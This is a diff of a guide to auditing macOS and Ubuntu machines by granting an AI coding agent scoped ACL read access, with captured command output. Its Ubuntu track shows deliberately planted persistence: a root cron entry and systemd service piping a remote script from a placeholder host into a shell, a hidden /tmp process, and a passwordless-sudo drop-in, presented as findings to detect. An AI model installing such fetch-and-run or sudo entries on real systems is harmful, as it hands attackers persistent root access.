@@ -46,7 +46,7 @@ This is the smaller version: access control lists, already built into macOS and 
 
 Ask Claude Code what it needs before granting anything ([more on why](/blog/what-a-claude-wants-needs/)).
 Send it in stages rather than one long prompt covering the whole session, so you're in the loop at each decision point instead of reviewing everything at the end.
-The worked example below runs this exact sequence against a real machine and shows what came back.
+The worked example below is what this sequence turns into once the lists come back, run command by command with the output each one returned.
 
 <Steps>
 
@@ -227,7 +227,7 @@ No credential exists for the agent's account to leak, cache, or hand off to some
 
 ## A Read Grant Doesn't Make the Content Trustworthy
 
-Everything above is about privilege: a read grant can't create a write capability, so it can't make anything *worse* in the ACL sense.
+Everything so far is about privilege: a read grant can't create a write capability, so it can't make anything *worse* in the ACL sense.
 It isn't risk-free in every sense, though, because whatever the file contains lands directly in the agent's context, and a log file's content isn't authored by you.
 
 A line in `/var/log/auth.log` is built from whatever tried to log in, an SSH username, before your machine ever wrote it down.
@@ -239,219 +239,55 @@ Not every log qualifies. A file that's purely local, your own shell history, an 
 This doesn't change the case for granting read broadly during diagnosis.
 It changes what you do with what comes back: read a suspicious log line yourself before letting the agent turn it into a write action, the same "verify before you trust it" discipline this guide already applies to grants themselves, applied here to content instead of permissions.
 
-## The Worked Example: Audit Your Own Machine
+## The Worked Example: Audit the Machine You're On
 
 Everything so far is the pattern stated in the abstract: grant read broadly, diagnose, grant write narrowly, fix, revoke.
 The fastest way to see it work is to run it against the machine in front of you.
-No service to install first, no second machine, just the sudo error at the top of this page and whatever you're reading this on.
+No service to install first, no second machine, just the error at the top of this page and whatever you're reading this on.
 
-What follows is that exact run, using the four-stage prompt sequence described earlier.
-The macOS track is a real run, captured verbatim from an actual machine.
-The Ubuntu track walks the identical sequence and shows what each command returns on a stock system, with one illustrative finding, the `/tmp/.sysupdate` process, included to show what the cross-check is for; that specific finding is a worked illustration, not a captured incident, and the section says so at the point it appears.
-
-### macOS
-
-<Verified date="2026-09" method="tested" />
-
-Most of a broad diagnostic read list turns out to need no grant at all on macOS.
-Stage 1's prompt asks Claude Code to test each candidate before listing it, and on a stock admin account most of the standard diagnostic locations are already readable: `/private/var/log/system.log`, `~/Library/LaunchAgents`, `/Library/LaunchAgents`, `/Library/LaunchDaemons`, `/etc/pf.conf`.
-None of those need a `chmod +a`.
-
-<Steps>
-
-1. **Check security posture with a handful of unprivileged commands.**
-
-   A few things are worth checking specifically because their status isn't obvious from the outside without attempting a read first, and none of them need a grant either:
-
-   ```shell
-   csrutil status && \
-   fdesetup status && \
-   spctl --status && \
-   sw_vers -productVersion && \
-   softwareupdate --list --no-scan && \
-   /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate
-   ```
-
-   None of this is a file.
-   `csrutil`, `fdesetup`, and `spctl` report on state SIP, FileVault, and Gatekeeper keep below the filesystem, the same reason `com.apple.alf.plist` no longer exists (see the write-target section below).
-   Running all six commands here took a few seconds: SIP enabled, FileVault on, Gatekeeper assessments enabled, current on updates, firewall enabled.
-   A clean posture reading is a legitimate outcome of a diagnostic pass, not a reason to keep digging for a finding that isn't there.
-
-1. **Check persistence locations, and cross-check anything enabled against what's actually installed.**
-
-   Persistence locations are next, and this is where something actually turned up:
-
-   ```shell
-   launchctl list | grep -v '^-' && \
-   launchctl print-disabled system
-   ```
-
-   Cross-checking installed software against what's still configured to run, the exact check Stage 2's prompt asks for, turned up two entries:
-
-   ```text
-   $ launchctl print-disabled system | grep docker
-       "com.docker.socket" => enabled
-       "com.docker.vmnetd" => enabled
-   ```
-
-   Both root-context daemons, both marked enabled.
-   Docker Desktop isn't installed on this machine:
-
-   ```shell
-   ls /Applications/Docker.app
-   ```
-
-   ```text
-   ls: /Applications/Docker.app: No such file or directory
-   ```
-
-   ```shell
-   which docker
-   ```
-
-   ```text
-   docker not found
-   ```
-
-   ```shell
-   ls /Library/LaunchDaemons/ | grep docker
-   ```
-
-   No output. No app, no CLI, and the `.plist` that used to define these two daemons is gone from `/Library/LaunchDaemons/` too.
-   Only the enabled bit survives, in launchd's own disabled-services override database, independent of the file that once set it.
-   Whatever removed Docker Desktop either didn't clear this or ran before it existed.
-   Either way, it's the kind of leftover a single glance wouldn't catch, since nothing about it changes once it's sitting there.
-
-   Not every candidate that looks the same turns out the same way.
-   Three TeamViewer LaunchDaemons sit in the same directory (`com.teamviewer.Helper.plist`, `com.teamviewer.UninstallerHelper.plist`, `com.teamviewer.UninstallerWatcher.plist`), the identical shape as the Docker entries: root-owned, LaunchDaemon, present on disk.
-   `TeamViewer.app` is still installed.
-   Not a finding, three files that needed the same check the Docker entries got, and came back clean.
-   This is what Stage 1's "test before you list it" instruction catches: two candidates that looked identical from the filesystem, one real, one not, distinguishable only by checking.
-
-1. **Fix the Docker finding directly, since it isn't an ACL problem.**
-
-   launchd's disabled-services database isn't a file Claude Code can be granted write access to.
-   It's a systemwide setting only root can change, the same category as the firewall toggle covered below under "Not a file, no matter what you grant."
-   The command is a single, human-typed `sudo` call, the same shape the rest of this guide already treats as expected for a root-owned action, not a workaround:
-
-   ```shell
-   sudo launchctl disable system/com.docker.socket
-   ```
-
-   ```shell
-   sudo launchctl disable system/com.docker.vmnetd
-   ```
-
-   That's the whole fix. No grant to set up, none to revoke afterward, because none was ever needed.
-
-1. **Check `/etc/sudoers` for a passwordless-sudo misconfiguration, and grant read.**
-
-   One more file is worth checking on macOS, and it answers a question this guide already raised: has anything already configured passwordless `sudo` without you noticing?
-
-   ```shell
-   ls -la /etc/sudoers
-   ```
-
-   ```text
-   -r--r-----  1 root  wheel  1709 Aug 12 22:51 /etc/sudoers
-   ```
-
-   Root-owned, group `wheel`, mode `0440`.
-   An ordinary admin account isn't a member of `wheel`:
-
-   ```shell
-   id -Gn | tr ' ' '\n' | grep -x wheel
-   ```
-
-   Nothing printed, not a member, so:
-
-   ```shell
-   head -c 1 /etc/sudoers
-   ```
-
-   ```text
-   head: /etc/sudoers: Permission denied
-   ```
-
-   "Permission denied," not "Operation not permitted," the filesystem itself is refusing, which is what makes this an ACL problem instead of the TCC kind covered below.
-
-   The general rule, stated once: on macOS, `Permission denied` means the filesystem itself is refusing, an ACL fixes it.
-   `Operation not permitted` means TCC or SIP is refusing above the filesystem, no ACL and no `sudo` fixes that.
-   On Linux, this split doesn't fully generalize: a mandatory access control system like SELinux or AppArmor can also deny with `EACCES`, so if a grant doesn't work after `setfacl` reports success, check `dmesg` or `journalctl` before assuming the syntax was wrong.
-
-   Before granting anything you're not sure about, `ls -lO` answers the SIP question in advance, on macOS:
-
-   ```shell
-   ls -lO /etc/sudoers
-   ```
-
-   ```text
-   -r--r-----  1 root  wheel  compressed 1709 Aug 12 22:51 /etc/sudoers
-   ```
-
-   No `restricted` flag, which is why this one is an ACL problem and not a SIP problem.
-   A file SIP actually protects shows `restricted` in that same column, and no `chmod +a`, no `sudo`, and no amount of retrying changes that.
-   Checking this before attempting a read tells you which category you're in before you spend time on a grant that was never going to work.
-
-   The grant:
-
-   ```shell
-   sudo chmod +a "${USER} allow read" /etc/sudoers
-   ```
-
-   That `sudo` runs once, at the keyboard, the same shape as the `/etc/hosts` grant shown earlier.
-   Claude Code never runs `sudo`.
-   After this one command it reads `/etc/sudoers`, and everything under `/etc/sudoers.d/`, the same way it reads anything else on the granted list.
-   On a clean install `/etc/sudoers.d/` is empty.
-   If it isn't, that's the finding, since installers for some older Docker- and VirtualBox-era macOS tooling have been known to drop `NOPASSWD` entries in there on install, unprompted.
-
-   None of this needed a write grant.
-   The Docker finding needed one `sudo` command at the keyboard, not a file grant at all, and the sudoers check came back clean, an empty `sudoers.d` and no passwordless entry.
-
-1. **Optional: check the software-update policy plist, a realistic write-grant example.**
-
-   If a later pass turns up something that does need a write, editing macOS's own update-deferral policy is a realistic example, since it reads from the same file `softwareupdate --list --no-scan` checks:
-
-   ```shell
-   ls -la /Library/Preferences/com.apple.SoftwareUpdate.plist
-   ```
-
-   ```text
-   -rw-r--r--  1 root  wheel  2717 Sep  1 09:48 com.apple.SoftwareUpdate.plist
-   ```
-
-   Readable by anyone, world-readable mode, no grant needed to check current policy.
-   Writable by nobody but root:
-
-   ```shell
-   touch /Library/Preferences/com.apple.SoftwareUpdate.plist
-   ```
-
-   ```text
-   touch: /Library/Preferences/com.apple.SoftwareUpdate.plist: Permission denied
-   ```
-
-   The grant is the same pattern as `/etc/hosts` below, one file, one command:
-
-   ```shell
-   sudo chmod +a "${USER} allow write" /Library/Preferences/com.apple.SoftwareUpdate.plist
-   ```
-
-   Revoked with `chmod -a#` the same way as anything else in this guide.
-
-</Steps>
+The two tracks below are deliberately different shapes, because the two platforms are.
+On Ubuntu the pattern is load-bearing from end to end: the file you want is unreadable, one grant fixes it, and almost everything you check afterward is a file.
+On macOS most of the same diagnosis needs no grant at all, and finding that out is the useful result rather than a disappointing one.
+Read the track you're on.
+Neither is a translation of the other, and working through both won't tell you twice as much.
 
 ### Ubuntu
 
-The same run on Ubuntu (24.04) follows the identical shape: broad read, narrow write, revoke.
-This section is a worked illustration of the sequence, not output captured from a live audit: no Ubuntu machine was available to run it against for this page.
-The commands themselves are correct POSIX and `setfacl`/`systemd` syntax; the specific results shown, including the `/tmp/.sysupdate` finding, are illustrative rather than a captured incident.
+The output blocks here were captured in an `ubuntu:24.04` container (24.04.4 LTS, `acl` 2.3.2) under Podman on 2026-09-02, and every one of them is what the command actually returned.
+This section carries no `tested` badge because that word is reserved here for output captured on real hardware, and container testing has already missed a real hardware bug once in a sibling guide.
+
+Most of what the container demonstrated was afterward confirmed on a real machine, a Debian 13 Raspberry Pi on `arm64`, on the same date: the `/etc/sudoers` and `/etc/sudoers.d/` modes, the denial, the `grep` exit-code behavior in steps 1 and 3, the ACL mask, `rX` versus `r` on a directory, default-ACL inheritance on genuinely rotated log files, and the difference between `setfacl -x` and `-k`.
+What stayed container-only is the grant itself, which needs an interactive `sudo`, and the persistence and cross-check demonstrations in steps 5 and 6.
+Debian and Ubuntu ship the same `acl` package and the same shipped modes on both sudoers paths, checked on both.
+
+Two things this run planted on purpose, so the checks have something to find: a `NOPASSWD` drop-in under `/etc/sudoers.d/`, and a systemd timer.
+Both are called out where they appear.
+On your own machine, finding nothing is the good outcome.
+
+The account being granted access here is a dedicated unprivileged user named `auditor`, which is also what the captured output shows.
+Substitute your own username.
+If the agent runs as your login user, that's `${USER}`, and the braces are not optional in zsh, see [The Gotchas](#the-gotchas).
 
 <Steps>
 
-1. **Check `/etc/sudoers` for a passwordless-sudo misconfiguration, and grant read.**
+1. **Confirm the denial, and check which wall you hit.**
 
-   The same passwordless-sudo question applies, and the check is the same shape as macOS:
+   Start with the file that answers the question this page opened with: has anything already configured passwordless `sudo` on this machine?
+
+   ```shell
+   stat -c "%a %U:%G %n" /etc/sudoers /etc/sudoers.d /etc/sudoers.d/README
+   ```
+
+   ```text
+   440 root:root /etc/sudoers
+   755 root:root /etc/sudoers.d
+   440 root:root /etc/sudoers.d/README
+   ```
+
+   Mode `0440`, owned `root:root`.
+   Note the split that matters later: the directory is `755`, so anyone can list it, while the files inside are `0440`, so nobody but root can read them.
+
+   The read fails, and how it fails is the diagnosis:
 
    ```shell
    head -c 1 /etc/sudoers
@@ -461,75 +297,280 @@ The commands themselves are correct POSIX and `setfacl`/`systemd` syntax; the sp
    head: cannot open '/etc/sudoers' for reading: Permission denied
    ```
 
-   `/etc/sudoers` is `0440`, owned by `root:root` on Ubuntu (not `wheel`, that group is macOS-specific), and an ordinary user isn't in the group that can read it either.
-   The grant:
+   `Permission denied` is the filesystem itself refusing, which is exactly the case an ACL is for.
+   On Linux, don't lean on that wording as hard as you can on macOS: a mandatory access control system like SELinux or AppArmor also denies with `Permission denied`, so if a grant reads back correctly and still doesn't work, check `dmesg` or `journalctl` before assuming the syntax was wrong.
+
+1. **Grant read on the one file, and confirm the grant did something.**
 
    ```shell
-   sudo setfacl -m "u:${USER}:r" /etc/sudoers
+   sudo setfacl -m "u:auditor:r" /etc/sudoers
    ```
 
-   And the confirmation that it actually took effect, not just that `setfacl` exited `0`:
+   That `sudo` is yours, typed once, because changing a root-owned file's ACL requires root.
+   Claude Code never runs it.
+
+   Confirm on the file, not on the exit code:
 
    ```shell
-   getfacl -p /etc/sudoers | grep '^user:'
+   getfacl -p /etc/sudoers | grep -E "^(user|mask)"
    ```
 
    ```text
    user::r--
    user:auditor:r--
+   mask::r--
    ```
 
-   `/etc/sudoers.d/` is worth a second look, because its own permissions aren't the same as the files inside it: the directory is world-readable and world-searchable (`drwxr-xr-x`), so filenames are visible without any grant at all, but the files inside are `0440` like `/etc/sudoers` itself, and need the same per-file grant to actually read.
-   On a clean install there's nothing suspicious to find:
+   The entry is present and the mask is `r--`, so it isn't capped.
+   Now the read works, with no `sudo` anywhere in it:
+
+   ```shell
+   head -n 3 /etc/sudoers
+   ```
+
+   ```text
+   #
+   # This file MUST be edited with the 'visudo' command as root.
+   #
+   ```
+
+   The mode never changed.
+   It's still `0440 root:root`, and `ls -l` marks the ACL with a trailing `+`:
+
+   ```shell
+   ls -l /etc/sudoers
+   ```
+
+   ```text
+   -r--r-----+ 1 root root 1800 Jan 29  2024 /etc/sudoers
+   ```
+
+   That `+` is reliable on Linux.
+   It is not reliable on macOS, for a reason covered in [The Gotchas](#the-gotchas).
+
+1. **Run the check you came for, and read its exit code before believing it.**
+
+   The whole point of granting that read was to search both sudoers locations for a passwordless entry:
 
    ```shell
    grep -r NOPASSWD /etc/sudoers /etc/sudoers.d/
    ```
 
-   No output, and nothing suspicious to report, the same clean result as the `sudoers.d` check on macOS.
+   ```text
+   grep: /etc/sudoers.d/README: Permission denied
+   ```
 
-1. **Check cron and systemd timers, Ubuntu's persistence locations.**
+   The grant covered `/etc/sudoers`, one file.
+   Everything inside `/etc/sudoers.d/` is a separate `0440` file that was never granted, so the check silently covered half of what you asked it to cover.
 
-   Cron and systemd timers are the rough equivalent of macOS's LaunchAgents and LaunchDaemons, and they don't show up in the same place, so both need a separate check.
+   This is the part worth internalizing, because it generalizes past this one command.
+   A check that found nothing and a check that couldn't read its inputs look almost identical, and `grep` distinguishes them in the exit code rather than the output:
+
+   ```shell
+   grep -r NOPASSWD /etc/sudoers /etc/sudoers.d/ >/dev/null 2>&1; echo "exit=$?"
+   ```
+
+   ```text
+   exit=2
+   ```
+
+   Exit `1` means it read everything and found nothing, the clean result.
+   Exit `2` means it hit an error, and a "clean" report built on exit `2` is reporting on files it never opened.
+
+   The container has one file in `/etc/sudoers.d/`, so it under-sells this.
+   The same command on a real Debian 13 machine, with six drop-ins from packages and past setup work, denies every one of them and still exits `2`:
+
+   ```text
+   grep: /etc/sudoers: Permission denied
+   grep: /etc/sudoers.d/010_proxy: Permission denied
+   grep: /etc/sudoers.d/010_dpkg-threads: Permission denied
+   grep: /etc/sudoers.d/010_at-export: Permission denied
+   grep: /etc/sudoers.d/claude-agent-switch: Permission denied
+   grep: /etc/sudoers.d/README: Permission denied
+   grep: /etc/sudoers.d/010_global-tty: Permission denied
+   ```
+
+   Redirect that to `/dev/null`, which is what a script or an agent would do, and the entire finding is the exit code.
+
+1. **Grant the drop-in directory, and watch a recursive grant break traversal.**
+
+   The obvious fix is to grant the whole directory recursively:
+
+   ```shell
+   sudo setfacl -R -m "u:auditor:r" /etc/sudoers.d/
+   ```
+
+   It exits `0`, and it does not work:
+
+   ```shell
+   grep -r NOPASSWD /etc/sudoers /etc/sudoers.d/
+   ```
+
+   ```text
+   grep: /etc/sudoers.d/README: Permission denied
+   ```
+
+   The entries are on the files, and they aren't masked:
+
+   ```shell
+   getfacl -p /etc/sudoers.d/README | grep -vE "^#"
+   ```
+
+   ```text
+   user::r--
+   user:auditor:r--
+   group::r--
+   mask::r--
+   other::---
+   ```
+
+   The problem is one level up.
+   `-R` applied `r` to the directory too, and on a directory a named-user entry *replaces* what that account was getting from `other` rather than adding to it, so the search bit is now gone.
+   The account can still list names and can no longer open anything by path:
+
+   ```shell
+   ls /etc/sudoers.d/
+   ```
+
+   ```text
+   90-cloud-init-users
+   README
+   ```
+
+   ```shell
+   cd /etc/sudoers.d
+   ```
+
+   ```text
+   bash: cd: /etc/sudoers.d: Permission denied
+   ```
+
+   Capital `X` puts the search bit back, and only on directories:
+
+   ```shell
+   sudo setfacl -m "u:auditor:rX" /etc/sudoers.d
+   ```
+
+   Nothing about the files changed, and the same check now runs to completion:
+
+   ```shell
+   grep -r NOPASSWD /etc/sudoers /etc/sudoers.d/; echo "exit=$?"
+   ```
+
+   ```text
+   /etc/sudoers.d/90-cloud-init-users:auditor ALL=(ALL) NOPASSWD: ALL
+   exit=0
+   ```
+
+   That drop-in is the one this run planted deliberately, so the check had something to find.
+   On a real machine, this is the finding: a file granting passwordless `sudo` that you don't remember adding, in the directory installers write to without asking.
+
+   Cover the files that arrive later, too, because a recursive grant is a snapshot of one moment:
+
+   ```shell
+   sudo setfacl -d -m "u:auditor:r" /etc/sudoers.d
+   ```
+
+   A file created after that command carries the entry on arrival:
+
+   ```shell
+   getfacl -p /etc/sudoers.d/90-cloud-init-users | grep "^user:auditor"
+   ```
+
+   ```text
+   user:auditor:r--
+   ```
+
+1. **Check both persistence surfaces, because a timer is invisible to a cron check.**
+
+   Cron first:
 
    ```shell
    crontab -l
    ```
 
    ```text
-   */15 * * * * curl -fsSL http://example.invalid/update.sh | sh
+   no crontab for root
    ```
-
-   A cron entry that pipes a remote script straight into a shell is the pattern worth recognizing on sight, whoever put it there.
-   Nothing about that syntax is unusual on its own, `curl | sh` is a common install pattern plenty of legitimate software uses.
-   What makes it worth a second look is that it runs unattended, every 15 minutes, from an entry you didn't recognize adding.
-   Read the script before trusting it, or don't run remote scripts unattended at all if you can help it.
 
    ```shell
    ls -la /etc/cron.d/
    ```
 
-   System-managed entries live here too, dropped in by installed packages.
-   A fresh install typically shows only entries tied to packages actually on the machine, worth a glance for anything that doesn't match something you installed.
+   ```text
+   -rw-r--r--. 1 root root  102 Mar 31  2024 .placeholder
+   -rw-r--r--. 1 root root  202 Apr  8  2024 e2scrub_all
+   -rw-r--r--. 1 root root   67 Sep  2 17:11 sysupdate
+   ```
+
+   The trailing `.` on each mode string is an SELinux label carried by the container image, and you won't see it on an ordinary Ubuntu install.
+
+   `e2scrub_all` ships with the `e2fsprogs` package.
+   `sysupdate` does not ship with anything, and it's the second thing this run planted:
+
+   ```shell
+   cat /etc/cron.d/sysupdate
+   ```
+
+   ```text
+   */15 * * * * root curl -fsSL http://example.invalid/update.sh | sh
+   ```
+
+   A remote script piped into a shell, unattended, every fifteen minutes, as root.
+   Nothing about `curl | sh` is unusual on its own, plenty of legitimate installers use it.
+   What makes this one worth a second look is that it runs on a schedule nobody set up on purpose.
+
+   Then timers, which are a completely separate surface:
 
    ```shell
    systemctl list-timers --all
    ```
 
-   This needs an actual systemd instance to answer, PID 1 running as `systemd`, which most containers don't have; run it on real hardware or a VM.
-   It shows every active timer unit and its next run, the direct systemd equivalent of `crontab -l`, and it's worth running alongside cron rather than instead of it: a persistence mechanism installed as a timer unit doesn't show up in any crontab at all.
+   ```text
+   NEXT                            LEFT LAST PASSED UNIT                         ACTIVATES
+   Wed 2026-09-02 17:17:34 UTC 4min 36s -         - sysupdate.timer              sysupdate.service
+   Wed 2026-09-02 17:27:34 UTC    14min -         - systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
+   Wed 2026-09-02 23:59:11 UTC       6h -         - motd-news.timer              motd-news.service
+   Thu 2026-09-03 00:00:00 UTC       6h -         - dpkg-db-backup.timer         dpkg-db-backup.service
+   Thu 2026-09-03 05:32:39 UTC      12h -         - apt-daily.timer              apt-daily.service
+   Thu 2026-09-03 06:56:41 UTC      13h -         - apt-daily-upgrade.timer      apt-daily-upgrade.service
+   Sun 2026-09-06 03:10:52 UTC   3 days -         - e2scrub_all.timer            e2scrub_all.service
+   -                                  - -         - fstrim.timer                 fstrim.service
 
-1. **Cross-check installed software against what's actually running.**
+   8 timers listed.
+   ```
 
-   Cross-checking installed software against what's actually running is the same check Stage 2 already asks for on macOS, and on Ubuntu it turned up something a persistence check is specifically for:
+   Seven of those are stock Ubuntu.
+   `sysupdate.timer` is planted, and this is the point of running both checks: `crontab -l` still says `no crontab for root`, and it will keep saying that no matter how many timers are installed.
+   A persistence check that only reads crontabs reports a clean machine here.
+
+   Ask what a timer actually runs, since the timer and the thing it triggers are two different units:
 
    ```shell
-   ps aux | grep sysupdate
+   systemctl cat sysupdate.service | grep ^ExecStart
    ```
 
    ```text
-   root   3300  0.0  0.1   4044  3028 ?  S  14:05  0:00 /bin/bash /tmp/.sysupdate
+   ExecStart=/bin/bash -c "curl -fsSL http://example.invalid/u.sh | sh"
    ```
+
+   `systemctl list-timers` needs systemd running as PID 1.
+   In a container without it, the command fails with `System has not been booted with systemd as init system (PID 1)`, which is a limitation of the container rather than a finding about the machine.
+
+1. **Cross-check what's running against what's installed.**
+
+   A list of what's installed and a list of what's running answer different questions, and the gap between them is where this kind of thing lives.
+   Rather than grepping for a name you already suspect, ask the general question:
+
+   ```shell
+   ps -eo user,pid,etime,args --no-headers | awk '$4 ~ /^\/(tmp|var\/tmp|dev\/shm)\// || $5 ~ /^\/(tmp|var\/tmp|dev\/shm)\//'
+   ```
+
+   ```text
+   root        4167       00:12 /bin/bash /tmp/.sysupdate
+   ```
+
+   Then ask whether anything accountable put it there:
 
    ```shell
    dpkg -S /tmp/.sysupdate
@@ -539,33 +580,234 @@ The commands themselves are correct POSIX and `setfacl`/`systemd` syntax; the sp
    dpkg-query: no path found matching pattern /tmp/.sysupdate
    ```
 
-   A running process, backed by a script sitting in `/tmp`, a world-writable directory, with a name chosen to look like a routine update, and no package owns it.
-   `dpkg -S` (or `rpm -qf` on a distribution that uses RPM) answers "did this come from somewhere accountable" for anything currently running, and a script executing from `/tmp`, `/var/tmp`, or `/dev/shm` is the pattern worth treating as suspicious first and explaining second, since nothing legitimate needs to run from a world-writable directory as a matter of course.
-
-1. **Check listening ports, saved to a dated file for the next diff.**
-
-   Listening ports are the last check, and the one worth saving to a dated file so a later run has something to diff against:
+   Compare against a legitimate daemon, which does have an owner:
 
    ```shell
-   ss -tlnp | tee "/var/log/port-audit-$(date +%F).txt"
+   dpkg -S /usr/sbin/cron
    ```
 
-   A fresh listener that wasn't there last week is a five-second diff away from being noticed, instead of something you'd only catch by remembering every port that's supposed to be open.
+   ```text
+   cron: /usr/sbin/cron
+   ```
 
-1. **Check patch cadence, and fix the `/tmp/.sysupdate` finding.**
+   A process running from a world-writable directory, with a name chosen to look routine, owned by no package.
+   `rpm -qf` answers the same question on RPM-based distributions.
 
-   Patch cadence needs no grant either:
+   Two more checks need no grant at all, and both are worth running while you're here:
+
+   ```shell
+   ss -tlnp
+   ```
 
    ```shell
    apt list --upgradable
    ```
 
-   The direct Ubuntu equivalent of `softwareupdate --list --no-scan` on macOS, worth checking for the same reason: a machine that's quietly stopped updating itself is a bigger risk than any single finding this check turns up.
+   Listening ports are worth saving to a dated file so the next run has something to diff against, and a machine that has quietly stopped updating itself is a larger risk than most single findings an audit turns up.
 
-   The `/tmp/.sysupdate` script is the one finding here that needs a write action, and it's not an ACL grant either.
-   It's deleting the file and the cron entry that restarts it, both things you already have write access to as yourself once you've confirmed what the script actually does.
-   The passwordless-sudo check found nothing, same as macOS.
-   If a real hardening pass on this machine also touched `/etc/hosts` or a `ufw` rule, that's the same low-blast-radius write example covered next.
+1. **Revoke, and remember the default ACL that `-x` leaves behind.**
+
+   ```shell
+   sudo setfacl -x "u:auditor" /etc/sudoers && \
+     sudo setfacl -R -x "u:auditor" /etc/sudoers.d
+   ```
+
+   That removes the named entries, and it does not remove the default ACL from step 4.
+   A default ACL is a separate thing and needs `-k`:
+
+   ```shell
+   sudo setfacl -k /etc/sudoers.d
+   ```
+
+   Confirm on the directory rather than on an exit code, since `setfacl -x` exits `0` even when the name it was given was never granted anything:
+
+   ```shell
+   getfacl -p /etc/sudoers.d | grep -vE "^#"
+   ```
+
+   ```text
+   user::rwx
+   group::r-x
+   mask::r-x
+   other::r-x
+   ```
+
+   No named entries, no `default:` lines, back to where the machine started.
+
+</Steps>
+
+### macOS
+
+<Verified date="2026-09" method="tested" />
+
+Re-verified on real hardware on 2026-09-02, macOS 26.6.2 (build 25G83), arm64, on a standard admin account.
+
+This track is shorter than the Ubuntu one, and the reason it's shorter is the finding.
+A broad diagnostic read list, run against a Mac, mostly doesn't need any grants, so most of the ACL machinery this page teaches has nothing to attach to.
+
+<Steps>
+
+1. **Run the read list first, and count how much of it actually needs a grant.**
+
+   Re-probing the twenty-one candidate diagnostic paths from an earlier audit of this machine came back: fifteen already readable by an ordinary admin account, three blocked by something no ACL can reach, and three absent from this macOS version entirely.
+   Zero of them needed an ACL.
+   The standard locations you'd reach for, `/private/var/log/system.log`, `~/Library/LaunchAgents`, `/Library/LaunchAgents`, `/Library/LaunchDaemons`, `/etc/pf.conf`, are all in the first group.
+   Granting read on them is a command that changes nothing.
+
+   A file that doesn't exist is frequently the answer you wanted, too.
+   `/Library/Preferences/com.apple.RemoteManagement.plist` absent means Apple Remote Desktop was never configured.
+
+   Most posture on macOS isn't a file at all, and every one of these answers an unprivileged user:
+
+   ```shell
+   csrutil status && \
+     fdesetup status && \
+     spctl --status && \
+     sw_vers -productVersion && \
+     /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate
+   ```
+
+   ```text
+   System Integrity Protection status: enabled.
+   FileVault is On.
+   assessments enabled
+   26.6.2
+   Firewall is enabled. (State = 1)
+   ```
+
+   There's nothing to scope here, because there's nothing to grant.
+   A clean posture reading is a legitimate result, not a sign you haven't dug deep enough.
+
+1. **Tell the two kinds of denial apart, because only one of them is an ACL problem.**
+
+   Two files, same admin account, two different refusals.
+
+   ```shell
+   head -c 1 /etc/sudoers
+   ```
+
+   ```text
+   head: /etc/sudoers: Permission denied
+   ```
+
+   ```shell
+   head -c 1 ~/Library/Application\ Support/com.apple.TCC/TCC.db
+   ```
+
+   ```text
+   head: /Users/edward/Library/Application Support/com.apple.TCC/TCC.db: Operation not permitted
+   ```
+
+   The second file is owned by the account running the command, mode `644`, world-readable, and it still fails.
+   That's the clean proof that the filesystem was never what said no:
+
+   ```shell
+   ls -l ~/Library/Application\ Support/com.apple.TCC/TCC.db
+   ```
+
+   ```text
+   -rw-r--r--  1 edward  staff  122880 Aug 30 10:32 /Users/edward/Library/Application Support/com.apple.TCC/TCC.db
+   ```
+
+   **`Permission denied`**: the filesystem is refusing, and an ACL fixes it.
+   **`Operation not permitted`**: TCC or System Integrity Protection is refusing above the filesystem, and neither an ACL nor `sudo` fixes it.
+
+   `ls -lO` answers the SIP half in advance, before you spend a grant on a file that was never going to open:
+
+   ```shell
+   ls -lO /etc/sudoers /System/Library/CoreServices/SystemVersion.plist
+   ```
+
+   ```text
+   -r--r-----  1 root  wheel  compressed 1709 Aug 12 22:51 /etc/sudoers
+   -r--r--r--  1 root  wheel  restricted  603 Aug 12 22:51 /System/Library/CoreServices/SystemVersion.plist
+   ```
+
+   `restricted` is the SIP marker, and it's a definite yes.
+   Its absence is not a definite no: `TCC.db` shows no flag and is unreadable anyway, so `ls -lO` rules SIP in, never out.
+
+1. **Grant the one file that genuinely needs it.**
+
+   `/etc/sudoers` is the macOS path in this whole exercise that both fails at the filesystem and answers a question this page has already spent two sections on.
+
+   ```shell
+   ls -la /etc/sudoers
+   ```
+
+   ```text
+   -r--r-----  1 root  wheel  1709 Aug 12 22:51 /etc/sudoers
+   ```
+
+   Mode `0440`, group `wheel`, and an ordinary admin account isn't a member of `wheel`:
+
+   ```shell
+   id -Gn | tr ' ' '\n' | grep -x wheel
+   ```
+
+   Nothing printed, so not a member.
+   Some older sysadmin guides suggest adding yourself to `wheel`; if you followed one, this file is already readable for you and this step is a no-op.
+
+   The grant, and the one `sudo` in this track, typed by you, once:
+
+   ```shell
+   sudo chmod +a "${USER} allow read" /etc/sudoers
+   ```
+
+   After that, Claude Code reads `/etc/sudoers` and everything under `/etc/sudoers.d/` the same way it reads anything else on the granted list, with no `sudo` and no password anywhere.
+   On this machine `/etc/sudoers.d/` is empty, which is the clean answer:
+
+   ```shell
+   ls -la /etc/sudoers.d/
+   ```
+
+   ```text
+   total 0
+   drwxr-xr-x   2 root  wheel    64 Aug 12 22:51 .
+   drwxr-xr-x  79 root  wheel  2528 Aug 19 22:21 ..
+   ```
+
+   If it isn't empty, that's the finding.
+   Installers from the Docker- and VirtualBox-era macOS tooling have been known to drop `NOPASSWD` entries in there on install, unprompted.
+
+   Granting an agent read access to the file that would hold a passwordless-`sudo` entry is the opposite of configuring one, even though the two sit one word apart on a skim.
+   This is the diagnosis, and it needs no standing credential to perform.
+
+1. **Notice what has no file to grant at all.**
+
+   Cross-checking what's enabled against what's installed turns up things on macOS that no ACL reaches.
+   On this machine:
+
+   ```shell
+   launchctl print-disabled system | grep -i docker
+   ```
+
+   ```text
+   "com.docker.socket" => enabled
+   "com.docker.vmnetd" => enabled
+   ```
+
+   Both root-context daemons, both enabled.
+   Docker Desktop is not installed:
+
+   ```shell
+   ls -d /Applications/Docker.app
+   ```
+
+   ```text
+   ls: /Applications/Docker.app: No such file or directory
+   ```
+
+   The app is gone, the CLI is gone, and the `.plist` that defined those two daemons is gone from `/Library/LaunchDaemons/`.
+   Only the enabled bit survives, in launchd's own override database, which is not a file you can grant access to.
+   Fixing it is one human-typed `sudo` per entry, not a grant:
+
+   ```shell
+   sudo launchctl disable system/com.docker.socket
+   ```
+
+   Not every candidate that looks the same turns out the same way.
+   Three TeamViewer LaunchDaemons sit in that same directory, identical in shape, and `TeamViewer.app` is still installed, so they're three files that needed the same check and came back clean.
+   That contrast is the whole argument for testing a candidate before listing it: two sets of files, indistinguishable from the filesystem, one real and one not.
 
 </Steps>
 
